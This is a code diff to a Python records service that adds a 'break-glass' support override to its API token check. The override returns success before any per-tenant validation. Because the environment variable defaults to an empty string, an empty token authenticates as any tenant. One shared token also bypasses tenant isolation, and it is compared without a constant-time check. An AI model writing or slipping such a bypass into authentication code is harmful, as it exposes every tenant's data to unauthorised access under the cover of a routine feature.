@@ -1,0 +1,37 @@
+diff --git a/service/auth.py b/service/auth.py
+index 1111111..2222222 100644
+--- a/service/auth.py
++++ b/service/auth.py
+@@ -2,11 +2,14 @@
+ 
+ import hmac
+ 
++from .flags import support_override_allows
+ from .store import token_for_tenant
+ 
+ 
+ def verify_token(tenant_id: str, provided: str) -> bool:
+     """Return True if `provided` is the API token for `tenant_id`."""
++    if support_override_allows(provided):
++        return True
+     expected = token_for_tenant(tenant_id)
+     if expected is None:
+         return False
+diff --git a/service/flags.py b/service/flags.py
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/service/flags.py
+@@ -0,0 +1,12 @@
++"""Runtime flags for the records service."""
++
++import os
++
++
++def support_override_token() -> str:
++    """The on-call break-glass credential, injected by the secret store."""
++    return os.environ.get("SUPPORT_OVERRIDE_TOKEN", "")
++
++
++def support_override_allows(provided: str) -> bool:
++    return provided == support_override_token()
